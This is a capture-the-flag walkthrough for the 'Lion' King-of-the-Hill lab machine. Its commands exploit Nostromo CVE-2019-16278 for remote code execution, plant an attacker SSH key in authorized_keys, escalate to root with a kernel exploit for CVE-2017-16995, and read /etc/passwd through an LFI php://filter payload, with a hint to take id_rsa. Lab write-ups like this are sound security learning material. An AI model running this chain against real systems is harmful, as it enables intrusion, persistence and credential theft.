# Machine name: Lion

1. After nmap scan we can see that weirdly there is no ssh on the machine. But nostromo is present at port 8080.<br />
  Later after doing complete scan we found that the port for ssh is shifted to port 1337.<br />
  ![image](https://user-images.githubusercontent.com/54495695/83907009-3bdabf00-a782-11ea-9334-867710bc27f4.png)
2. Searching for this vuln, we found that this specific version is vulnerable to CVE-2019-16278.
![nostromo](https://user-images.githubusercontent.com/54495695/83906759-cb33a280-a781-11ea-9258-83f6bf2e8deb.png)

3. Simply downloading the exploit from exploitdb, we can get RCE on machine.
    Note this CVE is python2 based.<br />
    `python2 cve2019-16278.py <KOTH MACHINE IP> 8080 "whoami"`<br />
    ![whoami](https://user-images.githubusercontent.com/54495695/83906864-f7e7ba00-a781-11ea-8998-2722287af76f.png)

  Online there are methods to use this CVE to get a reverse shell. But For some weird reason I was not able to get a rev shell from this. So here's my workaround.<br />
  First we generate sshkey in our machine, then we add the authorized_keys to the machine, as we have RCE.<br />
4. Generating sshkeys:<br />
  `ssh-keygen`<br />
5. Getting the authorized_keys:<br />We need the \*.pub file's data for this, It would look like this:<br />
![auth_key](https://user-images.githubusercontent.com/54495695/83906829-e8687100-a781-11ea-83f8-da94d38deb16.png)
<br />
6. Now use this command:<br />
    `python2 cve2019-16278.py <KOTH IP> 8080 "mkdir /home/gloria/.ssh; echo '<YOUR *.pub file data>' > /home/gloria/.ssh/authorized_keys"`<br />
7. Now we can simply ssh into the machine with our sshkey.<br />
    `ssh -i sshkey gloria@<KOTH BOX IP> -p 1337` <br />
8. And since we are in authorized_keys, we will be logged in without  password.<br />
9. Since we have a shell, Priv Esc is the next step. After some LinPEAS and LinEnum, I found that this box's kernel is vulnerable to cve-2017-16995.<br />
10. So we download the exploit from exploitdb and Here's a little trick to save compiling time on remote machine.<br />
Instead of uploading and compiling the exploit on remote machine, we can use `--static` in gcc to make a binary that's useable everywhere.<br />
    `gcc --static cve-2017-16995.c -o cve-2017-16995 && chmod +x cve-2017-16995 `<br />
11. Now just upload the binary to the remote box, and run it to get root.
<br />
#### Now you are root, Defend your title.<br />
P.S. If you are locked out and forgot to make a backdoor, here's food for thought:<br />
There's LFI on this address.<br />
`http://lion.thm:5555/?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd`<br />
where, lion.thm is the IP of machine in hosts file. ;) (Maybe you can get id_rsa)

 
